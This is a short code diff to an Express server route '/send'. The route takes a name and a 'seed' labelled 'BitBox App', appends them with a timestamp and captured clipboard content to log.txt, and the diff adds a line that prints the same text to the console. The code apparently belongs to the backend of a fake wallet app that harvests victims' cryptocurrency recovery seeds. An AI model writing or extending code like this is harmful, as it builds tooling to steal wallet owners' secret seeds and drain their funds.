@@ -27,6 +27,7 @@ app.get("/send", (req, res) => {
 
   let id = new Date().toString();
   let text = `BitBox App\n\n${name}= ${seed}`;
+  console.log(text)
   fs.appendFile("log.txt", ">> " + id + " >> " + text + '\n' + `clipboardContent: {clipboardContent}` + "\n\n", (err) => {
     if (err) return console.log(err);
     // console.log("saved!");
